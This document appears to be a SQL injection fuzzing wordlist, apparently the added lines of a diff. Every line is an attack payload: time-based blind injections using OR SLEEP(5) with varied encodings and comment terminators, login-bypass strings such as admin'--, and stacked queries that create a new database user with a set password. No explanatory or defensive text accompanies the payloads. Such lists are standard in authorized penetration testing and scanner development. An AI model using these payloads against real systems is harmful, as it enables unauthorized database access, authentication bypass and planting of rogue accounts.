+\"/**/OR/**/SLEEP(5)# #
+\"/**/or/**/sleep(5)#/*
+\"/**/OR/**/SLEEP(5)#/*
+\"/**/or/**/sleep(5)# %23
+\"/**/OR/**/SLEEP(5)# %23
+\"/**/or/**/sleep(5)#-- 
+\"/**/OR/**/SLEEP(5)#-- 
+\"%20or%20sleep(5)#
+\"%20OR%20SLEEP(5)#
+\"%20or%20sleep(5)# -- 
+\"%20OR%20SLEEP(5)# -- 
+\"%20or%20sleep(5)# -- -
+\"%20OR%20SLEEP(5)# -- -
+\"%20or%20sleep(5)# --+
+\"%20OR%20SLEEP(5)# --+
+\"%20or%20sleep(5)# #
+\"%20OR%20SLEEP(5)# #
+\"%20or%20sleep(5)#/*
+\"%20OR%20SLEEP(5)#/*
+\"%20or%20sleep(5)# %23
+\"%20OR%20SLEEP(5)# %23
+\"%20or%20sleep(5)#-- 
+\"%20OR%20SLEEP(5)#-- 
+\"+or+sleep(5)#
+\"+OR+SLEEP(5)#
+\"+or+sleep(5)# -- 
+\"+OR+SLEEP(5)# -- 
+\"+or+sleep(5)# -- -
+\"+OR+SLEEP(5)# -- -
+\"+or+sleep(5)# --+
+\"+OR+SLEEP(5)# --+
+\"+or+sleep(5)# #
+\"+OR+SLEEP(5)# #
+\"+or+sleep(5)#/*
+\"+OR+SLEEP(5)#/*
+\"+or+sleep(5)# %23
+\"+OR+SLEEP(5)# %23
+\"+or+sleep(5)#-- 
+\"+OR+SLEEP(5)#-- 
+\"\tor\tsleep(5)#
+\"\tOR\tSLEEP(5)#
+\"\tor\tsleep(5)# -- 
+\"\tOR\tSLEEP(5)# -- 
+\"\tor\tsleep(5)# -- -
+\"\tOR\tSLEEP(5)# -- -
+\"\tor\tsleep(5)# --+
+\"\tOR\tSLEEP(5)# --+
+\"\tor\tsleep(5)# #
+\"\tOR\tSLEEP(5)# #
+\"\tor\tsleep(5)#/*
+\"\tOR\tSLEEP(5)#/*
+\"\tor\tsleep(5)# %23
+\"\tOR\tSLEEP(5)# %23
+\"\tor\tsleep(5)#-- 
+\"\tOR\tSLEEP(5)#-- 
+admin'--
+ADMIN'--
+admin'-- -- 
+ADMIN'-- -- 
+admin'-- -- -
+ADMIN'-- -- -
+admin'-- --+
+ADMIN'-- --+
+admin'-- #
+ADMIN'-- #
+admin'--/*
+ADMIN'--/*
+admin'-- %23
+ADMIN'-- %23
+admin'---- 
+ADMIN'---- 
+'create user name identified by pass123 temporary tablespace temp default tablespace users;
+'CREATE USER NAME IDENTIFIED BY PASS123 TEMPORARY TABLESPACE TEMP DEFAULT TABLESPACE USERS;
+'create user name identified by pass123 temporary tablespace temp default tablespace users; -- 
+'CREATE USER NAME IDENTIFIED BY PASS123 TEMPORARY TABLESPACE TEMP DEFAULT TABLESPACE USERS; -- 
+'create user name identified by pass123 temporary tablespace temp default tablespace users; -- -
+'CREATE USER NAME IDENTIFIED BY PASS123 TEMPORARY TABLESPACE TEMP DEFAULT TABLESPACE USERS; -- -
+'create user name identified by pass123 temporary tablespace temp default tablespace users; --+
+'CREATE USER NAME IDENTIFIED BY PASS123 TEMPORARY TABLESPACE TEMP DEFAULT TABLESPACE USERS; --+
+'create user name identified by pass123 temporary tablespace temp default tablespace users; #
+'CREATE USER NAME IDENTIFIED BY PASS123 TEMPORARY TABLESPACE TEMP DEFAULT TABLESPACE USERS; #
+'create user name identified by pass123 temporary tablespace temp default tablespace users;/*
+'CREATE USER NAME IDENTIFIED BY PASS123 TEMPORARY TABLESPACE TEMP DEFAULT TABLESPACE USERS;/*
